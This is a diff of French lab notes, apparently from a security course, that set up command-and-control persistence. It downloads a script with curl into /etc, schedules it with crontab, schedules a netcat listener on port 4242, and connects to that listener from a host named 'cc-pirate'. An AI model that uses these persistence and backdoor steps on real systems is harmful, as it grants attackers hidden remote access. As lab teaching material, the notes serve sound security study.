@@ -225,7 +225,7 @@ A10)
 
 
 
-- Serveur entreprise :
+- poste :
 
 ```bash
 curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/cc.sh > cc.sh
@@ -234,6 +234,7 @@ mv cc.sh /etc
 
 # lister les actions du fichier crontab
 sudo crontab -l 
+
 
 sudo export EDITOR=nano
 sudo crontab -e
@@ -246,7 +247,7 @@ H 3 * * * /etc/cc.sh &> /dev/null
 
 
 # ou
-H 3 * * * nc -l -p 5659 &> /dev/null
+H 3 * * * nc -l -p 4242 &> /dev/null
 
 
 # ou
@@ -258,7 +259,7 @@ H 3 * * * nc -l -p 5659 &> /dev/null
 
 - Serveur CC :
 
-nc $ipsrventreprise 5689
+nc $ipsrventreprise 4242
 
 
 
@@ -289,7 +290,8 @@ attaque : depuis cc-pirate :
 
 
 ## définitions des IP
-
+177.16.1.2 ftp-pirate
+177.16.1.4 ssh-pirate
 177.16.1.5 cc-pirate
 <!-- 177.16.1.3 pirate  *obsolète* -->
 
